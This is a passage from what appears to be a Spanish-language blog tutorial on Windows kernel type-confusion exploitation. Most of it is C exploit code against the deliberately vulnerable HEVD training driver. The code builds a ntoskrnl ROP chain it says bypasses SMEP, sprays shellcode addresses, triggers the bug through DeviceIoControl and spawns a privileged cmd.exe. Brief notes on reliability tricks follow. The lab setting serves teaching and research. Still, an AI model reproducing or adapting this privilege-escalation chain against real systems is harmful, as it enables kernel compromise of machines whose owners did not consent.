</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#f92672">*</span>rop<span style="color:#f92672">++</span> <span style="color:#f92672">=</span>      <span style="color:#ae81ff">0x000004</span>; <span style="color:#75715e">// 0x40ed4e: pop rdx ; pop rax ; pop rcx ; ret ; (1 found)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#f92672">*</span>rop<span style="color:#f92672">++</span> <span style="color:#f92672">=</span>      <span style="color:#ae81ff">0x000000</span>; <span style="color:#75715e">// [filler]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#f92672">*</span>rop<span style="color:#f92672">++</span> <span style="color:#f92672">=</span>      <span style="color:#ae81ff">0x000000</span>; <span style="color:#75715e">// [filler]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#f92672">*</span>rop<span style="color:#f92672">++</span> <span style="color:#f92672">=</span> nt <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x3788b6</span>; <span style="color:#75715e">// xor  [rbx+0x08], edx ; mov rbx, qword [rsp+0x60] ; add rsp, 0x40 ; pop r14 ; pop rdi ; pop rbp ; ret
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* Now we cam spray our shellcode address since SMEP and VPS should be bypassed */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0xC</span>; i<span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>rop<span style="color:#f92672">++</span> <span style="color:#f92672">=</span> (<span style="color:#66d9ef">uint64_t</span>)shellcode;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">/* Exploit():
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     Type Confusion */</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">Exploit</span>(HANDLE hHEVD)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>rop <span style="color:#f92672">=</span> NULL;
</span></span><span style="display:flex;"><span>  BOOL bBlocked;
</span></span><span style="display:flex;"><span>  DWORD dwBytesReturned <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  LPVOID lpvNtKrnl <span style="color:#f92672">=</span> NULL;
</span></span><span style="display:flex;"><span>  LPVOID lpvAllocation <span style="color:#f92672">=</span> NULL;
</span></span><span style="display:flex;"><span>  LPVOID lpvAllocTarget <span style="color:#f92672">=</span> NULL;
</span></span><span style="display:flex;"><span>  USER_TYPE_CONFUSION_OBJECT UserTypeConfusionObject <span style="color:#f92672">=</span> { <span style="color:#ae81ff">0</span> };
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  lpvNtKrnl <span style="color:#f92672">=</span> <span style="color:#a6e22e">GetKernelModuleBase</span>(<span style="color:#e6db74">&#34;ntoskrnl&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (lpvNtKrnl <span style="color:#f92672">==</span> NULL)
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Failed to obtain the base address of nt</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Obtained the base address of nt: 0x%p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, lpvNtKrnl);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* Allocate memory one page before the target memory region. This helps prevent
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     the Double Fault; Logic here is avoid not triggering &#34;Demand Paging&#34;. */</span>
</span></span><span style="display:flex;"><span>  lpvAllocTarget <span style="color:#f92672">=</span> (LPVOID)<span style="color:#ae81ff">0x48000000</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Allocation to be made at 0x%p - PAGE_SIZE</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, lpvAllocTarget);
</span></span><span style="display:flex;"><span>  lpvAllocation <span style="color:#f92672">=</span> <span style="color:#a6e22e">VirtualAlloc</span>((lpvAllocTarget <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x1000</span>),
</span></span><span style="display:flex;"><span>                               <span style="color:#ae81ff">0x10000</span>,
</span></span><span style="display:flex;"><span>                               (MEM_COMMIT <span style="color:#f92672">|</span> MEM_RESERVE),
</span></span><span style="display:flex;"><span>                               PAGE_READWRITE);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (lpvAllocation <span style="color:#f92672">==</span> NULL)
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Failed to allocate memory</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Successfully created allocation: 0x%p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, lpvAllocation);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* Trigger the Type Confusion by overwriting the function pointer */</span>
</span></span><span style="display:flex;"><span>  UserTypeConfusionObject.ObjectId <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4242424242424242</span>;
</span></span><span style="display:flex;"><span>  UserTypeConfusionObject.ObjectType <span style="color:#f92672">=</span> (<span style="color:#66d9ef">uint64_t</span>)lpvNtKrnl <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x28d700</span>; <span style="color:#75715e">// mov esp, 0x48000000 ; add esp, 0x28 ; ret
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* Let the Kernel breathe... this is needed to avoid a crash, my thoery is
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     if we don&#39;t do this the allocation will not be mapped properly. So what
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     we need to do is sleep for a few seconds to allow this to happen! First
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     time trying this I was under the impression VirtualLock was needed, but
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     when testing it never locked? So after debugging I found this to be the
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     solution. This exploit succeded 9/10 times vs the original 2/10 ;D */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Letting the kernel breathe&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">4</span>; i<span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">putchar</span>(<span style="color:#e6db74">&#39;.&#39;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">Sleep</span>(<span style="color:#ae81ff">1000</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">putchar</span>(<span style="color:#e6db74">&#39;\n&#39;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* Fill the page before the target region with random data */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">RtlFillMemory</span>(lpvAllocation, <span style="color:#ae81ff">0x1000</span>, <span style="color:#e6db74">&#39;A&#39;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* Write the gadget chain at the location we return */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">WriteGadgets</span>(lpvNtKrnl, (lpvAllocTarget <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x28</span>));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Triggering Type Confusion</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">DeviceIoControl</span>(hHEVD,
</span></span><span style="display:flex;"><span>                  TYPE_CONFUSION,
</span></span><span style="display:flex;"><span>                  <span style="color:#f92672">&amp;</span>UserTypeConfusionObject,
</span></span><span style="display:flex;"><span>                  <span style="color:#66d9ef">sizeof</span>(UserTypeConfusionObject),
</span></span><span style="display:flex;"><span>                  NULL,
</span></span><span style="display:flex;"><span>                  <span style="color:#ae81ff">0x00</span>,
</span></span><span style="display:flex;"><span>                  <span style="color:#f92672">&amp;</span>dwBytesReturned,
</span></span><span style="display:flex;"><span>                  NULL);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">CheckWin</span>();
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  HANDLE hHEVD <span style="color:#f92672">=</span> NULL;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  hHEVD <span style="color:#f92672">=</span> <span style="color:#a6e22e">CreateFileA</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">.</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">HackSysExtremeVulnerableDriver&#34;</span>,
</span></span><span style="display:flex;"><span>                      (GENERIC_READ <span style="color:#f92672">|</span> GENERIC_WRITE),
</span></span><span style="display:flex;"><span>                      <span style="color:#ae81ff">0x00</span>,
</span></span><span style="display:flex;"><span>                      NULL,
</span></span><span style="display:flex;"><span>                      OPEN_EXISTING,
</span></span><span style="display:flex;"><span>                      FILE_ATTRIBUTE_NORMAL,
</span></span><span style="display:flex;"><span>                      NULL);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (hHEVD <span style="color:#f92672">==</span> INVALID_HANDLE_VALUE)
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Failed to get a handle on HackSysExtremeVulnerableDriver</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">Exploit</span>(hHEVD) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Exploitation successful, enjoy the shell!!</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;cmd.exe&#34;</span>);
</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Exploitation failed, run again</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (hHEVD <span style="color:#f92672">!=</span> NULL)
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">CloseHandle</span>(hHEVD);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Si me seguiste, teníamos una página válida? Entonces, por qué necesitábamos VirtualLock?</p>
<p>Bueno&hellip; no era necesarios! El exploit mostrado arriba no utilizó la función VirtualLock. Durante la depuración vimos que la página era válida&hellip; además VirtualLock nunca tuvo éxito&hellip; Continuaba recibiendo el código de error ERROR_NOACCESS (0x3E6), lo que significa que la página nunca se &ldquo;bloqueó&rdquo;.</p>
<p>Si consultas la documentación en MSDN verá que a veces se necesitan dos llamadas, debido a la forma en que funciona esta función. ¿Necesita mayores privilegios? No estoy seguro, pero lo eliminé para comprobar si hacía algo y, para mi sorpresa, no sea.</p>
<p>Además, encontré que la explotación era realmente poco confiable. Para que funcione el 90% del tiempo (si no el 100%), qué se debe hacer?</p>
<p>Lo has adivinado! Una llamada a <code>Sleep()</code> :P</p>
<p>Mi teoría es que la asignación necesitaba tiempo para &ldquo;registrarse&rdquo;. Explotación se muestra a abajo!</p>
<p><img src="/0x06-Approaching-Modern-Windows-Kernel-Type-Confusions/exploit.gif" alt="alt text"></p>
<h1 id="recursos">Recursos</h1>
<pre tabindex="0"><code>https://wafzsucks.medium.com/how-a-simple-k-typeconfusion-took-me-3-months-long-to-create-a-exploit-f643c94d445f
https://kristal-g.github.io/2021/02/20/HEVD_Type_Confusion_Windows_10_RS5_x64.html
https://kristal-g.github.io/2021/02/07/HEVD_StackOverflowGS_Windows_10_RS5_x64.html
</code></pre>
    </div>
    <div class="post-footer">
      
    </div>
  </article>

    </main>
  </body>
</html>
